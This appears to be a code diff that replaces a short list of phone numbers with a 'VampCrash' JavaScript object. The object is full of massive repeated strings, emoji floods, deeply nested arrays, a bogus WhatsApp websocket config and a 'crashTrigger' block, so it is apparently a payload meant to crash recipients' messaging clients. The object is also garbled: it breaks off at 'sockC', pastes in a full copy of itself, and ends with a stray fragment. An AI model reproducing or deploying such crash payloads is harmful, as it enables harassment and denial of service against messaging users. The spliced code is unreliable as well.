@@ -1,5 +1,109 @@
-[
-  "6283132169210",
-  "6282222222222",
-  "6283333333333"
-]
+{
+  status: true,
+  criador: "VampCrash",
+  timestamp: Date.now(),
+  noise: "A".repeat(10000), // 1 juta karakter
+  resultado: {
+    type: "md",
+    dummyRepeat: Array(50).fill({
+      id: "VampBot" + Math.random(),
+      message: "💀".repeat(5000),
+      crash: {
+        deepLevel: {
+          level1: {
+            level2: {
+              level3: {
+                level4: {
+                  level5: {
+                    loop: Array(50).fill("🪷".repeat(500))
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }),
+    ws: {
+      _events: {
+        "CB:ib,,dirty": ["Array"]
+      },
+      _eventsCount: 999999,
+      _maxListeners: 0,
+      url: "wss://web.whatsapp.com/ws/chat",
+      config: {
+        version: new Array(500).fill([99, 99, 99]),
+        browser: new Array(100).fill(["Chrome", "Linux"]),
+        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+        sockC{
+  status: true,
+  criador: "VampCrash",
+  timestamp: Date.now(),
+  noise: "A".repeat(10000), // 1 juta karakter
+  resultado: {
+    type: "md",
+    dummyRepeat: Array(50).fill({
+      id: "VampBot" + Math.random(),
+      message: "💀".repeat(5000),
+      crash: {
+        deepLevel: {
+          level1: {
+            level2: {
+              level3: {
+                level4: {
+                  level5: {
+                    loop: Array(50).fill("🪷".repeat(500))
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }),
+    ws: {
+      _events: {
+        "CB:ib,,dirty": ["Array"]
+      },
+      _eventsCount: 999999,
+      _maxListeners: 0,
+      url: "wss://web.whatsapp.com/ws/chat",
+      config: {
+        version: new Array(500).fill([99, 99, 99]),
+        browser: new Array(100).fill(["Chrome", "Linux"]),
+        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+        sockCectTimeoutMs: 100,
+        keepAliveIntervalMs: 10,
+        logger: {
+          logs: Array(100).fill("Vampire was here")
+        },
+        spam: Array(100).fill("🪺").join(""),
+        auth: { Object: "authData" },
+        crashTrigger: {
+          nullField: null,
+          undefinedField: undefined,
+          boolSwitch: [true, false, false, true, null],
+          crazyArray: new Array(1000).fill(Math.random())
+        },
+        mobile: true
+      }
+    }
+  }
+}ectTimeoutMs: 100,
+        keepAliveIntervalMs: 10,
+        logger: {
+          logs: Array(100).fill("Vampire was here")
+        },
+        spam: Array(100).fill("🪺").join(""),
+        auth: { Object: "authData" },
+        crashTrigger: {
+          nullField: null,
+          undefinedField: undefined,
+          boolSwitch: [true, false, false, true, null],
+          crazyArray: new Array(1000).fill(Math.random())
+        },
+        mobile: true
+      }
+    }
+  }
+}
